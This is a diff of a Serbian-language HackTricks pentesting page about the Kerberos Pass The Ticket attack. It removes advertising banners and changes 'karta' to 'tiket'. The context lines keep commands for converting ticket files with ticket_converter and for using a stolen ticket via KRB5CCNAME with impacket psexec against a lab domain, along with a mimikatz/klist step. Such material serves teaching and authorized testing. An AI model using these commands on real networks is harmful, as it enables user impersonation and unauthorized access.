@@ -2,26 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
-Pribavite pristup danas:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
-
 ## Pass The Ticket (PTT)
 
-U metodi napada **Pass The Ticket (PTT)**, napadači **kradu autentifikacionu kartu korisnika** umesto njihove lozinke ili heš vrednosti. Ova ukradena karta se zatim koristi za **improvizaciju korisnika**, sticanje neovlašćenog pristupa resursima i uslugama unutar mreže.
+U metodi napada **Pass The Ticket (PTT)**, napadači **kradu korisnički autentifikacioni tiket** umesto njihove lozinke ili heš vrednosti. Ovaj ukradeni tiket se zatim koristi za **impostaciju korisnika**, stičući neovlašćen pristup resursima i uslugama unutar mreže.
 
 **Pročitajte**:
 
-- [Berba karata sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [Berba karata sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [Berba tiketa sa Windows-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Berba tiketa sa Linux-a](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Zamena Linux i Windows karata između platformi**
+### **Razmena Linux i Windows tiketa između platformi**
 
-Alat [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertuje formate karata koristeći samo kartu i izlaznu datoteku.
+Alat [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertuje formate tiketa koristeći samo tiket i izlaznu datoteku.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -31,7 +23,7 @@ Converting kirbi => ccache
 ```
 U Windows-u [Kekeo](https://github.com/gentilkiwi/kekeo) može se koristiti.
 
-### Napad Pass The Ticket
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -47,13 +39,5 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 ## Reference
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
-Pribavite pristup danas:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}
 
 {{#include ../../banners/hacktricks-training.md}}
